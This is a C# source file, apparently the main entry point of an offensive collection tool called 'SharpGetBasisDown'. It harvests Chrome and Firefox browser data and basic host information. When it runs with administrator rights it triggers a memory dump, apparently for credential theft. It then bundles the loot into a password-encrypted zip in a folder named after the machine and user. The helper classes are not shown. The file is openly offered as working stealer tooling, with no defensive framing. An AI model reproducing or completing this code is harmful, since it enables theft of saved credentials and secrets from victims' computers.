using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;

namespace SharpGetBasisDown
{
    class Program
    {
        public static string CreateDirectory()
        {
            string DirectoryName = Environment.CurrentDirectory + @"\GetBasisDown\" + String.Format("\\{0}_{1}", Environment.MachineName, Environment.UserName);
            if (!Directory.Exists(DirectoryName))
            {
                Directory.CreateDirectory(DirectoryName);
            }
            return DirectoryName;
        }
        public static bool IsHighIntegrity()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static void Main(string[] args)
        {
            BrowserLocation.ChromeLocation();
            BrowserLocation.FroefoxLocation();
            BasisInfo.BasisInfos();
            if (IsHighIntegrity())
            {
                MiniDump.Minidump();
            }
            EncryptedZIPs.Encrypted(args[0]);
        }
    }
}
